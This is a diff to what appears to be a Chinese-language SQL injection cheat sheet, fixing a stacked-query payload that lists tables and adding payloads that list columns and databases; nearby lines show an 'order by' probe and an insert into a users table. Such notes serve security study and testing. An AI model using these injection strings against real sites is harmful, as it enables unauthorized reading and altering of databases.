@@ -643,7 +643,7 @@ id =1' order by 3--+
 #### <mark style="color:purple;">(2)查看表名</mark>
 
 ```sql
-id =1'; show tables %23
+id =1'; show tables ;%23
 ```
 
 #### <mark style="color:purple;">(3)插入数据</mark>
@@ -652,6 +652,20 @@ id =1'; show tables %23
 id=1'; insert into users(id,usrenamt,password)
 values(88,'aaa','bbb') #
 ```
+
+#### <mark style="color:purple;">（4）查看列名</mark>
+
+```sql
+id=1';show columns from 数据表 ;%23
+```
+
+#### <mark style="color:purple;">(5)查看库名</mark>
+
+```sql
+id=1';show databases ;#
+```
+
+
 
 ***
 
